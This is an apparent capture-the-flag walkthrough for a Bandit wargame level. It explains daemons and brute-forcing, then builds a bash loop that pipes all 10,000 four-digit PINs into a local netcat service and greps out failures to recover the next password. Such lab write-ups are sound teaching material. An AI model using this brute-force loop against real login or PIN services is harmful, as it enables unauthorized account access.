# BANDIT Level 22 -> 23


## GOAL
To find the next password by sending the right 4 digit pincode to a daemon listening on a given port.


## CONTEXT
### 1
A daemon is a background process that runs continuously and provides a service without requiring direct interaction from a user. In Unix-like systems, daemons are typically started automatically when the system boots and remain active waiting for events or requests, such as incoming network connections, scheduled tasks, or hardware notifications. Examples include cron for scheduled jobs and SSH servers for remote access. Daemons usually have names ending in 'd', such as `sshd` or `crond`, where the 'd' stands for daemon.


### 2
Brute-forcing is a technique that systematically tries every possible value until the correct one is found. Instead of exploiting a weakness in the system, it relies on exhaustive search and is guaranteed to succeed if the search space is small enough. 

This method is commonly used in security testing, CTF challenges and programming in general, but it can be very slow or impractical when the number of possible combinations is large.


## STEPS
After the previous level, you can probably imagine that we will be writing a script again to solve this one. So we might as well start by creating a temporary directory to work in and a bash script inside:

```bash
mktemp -d
cd **temporary directory path**
touch script.sh
chmod 755 script.sh
nano script.sh
```

By this point, we already know two things:
* We can connect to the listening daemon with the command `nc localhost 30002`
* We can use a `for` loop like we did in level 16 to go through all 10000 combinations for a 4-digit pincode. We can express the range of different pincodes like this: `{0000..9999}`

With this knowledge, we could construct something such as this

```bash
#!/bin/bash
nc localhost 30002
for i in {0000..9999}; do
	echo "**previous password** $i"
done 
```

The problem with this code is that the `echo` command occurs outside of the `nc` connection. Because of this, the first fix we are gonna do to our code is piping the `for` loop to the `nc` command:

```bash
#!/bin/bash
for i in {0000..9999}; do
	echo "**previous password** $i"
done | nc localhost 30002
```

We could leave it at that, but if you run the script as it is, you will receive a very long and unreadable output, since every wrong pincode receives an error response. We can easily solve this by saving the output onto a file and filtering the response:

```bash
#!/bin/bash
for i in {0000..9999}; do
	echo "**previous password** $i"
done | nc localhost 30002 > /tmp/**your directory**/file 
```

Note that you do not need to create the file beforehand. As long as the directory exists, the file will be automatically created.

Now we simply need to either `grep` the contents of the file, or pipe the output to `grep` and then save that version to the file.
A way of doing the latter option is using the `-v` option in `grep`, which rejects every line that matches the pattern:

```bash
#!/bin/bash
for i in {0000..9999}; do
	echo "**previous password** $i"
done | nc localhost 30002 | grep -v "Wrong" > /tmp/**your directory**/file 
```

Now you should be able to read the password from the file:

```bash
cat file
```


## SUMMARY
We have learnt how to write a shell script brute-force the retrieval of the password.
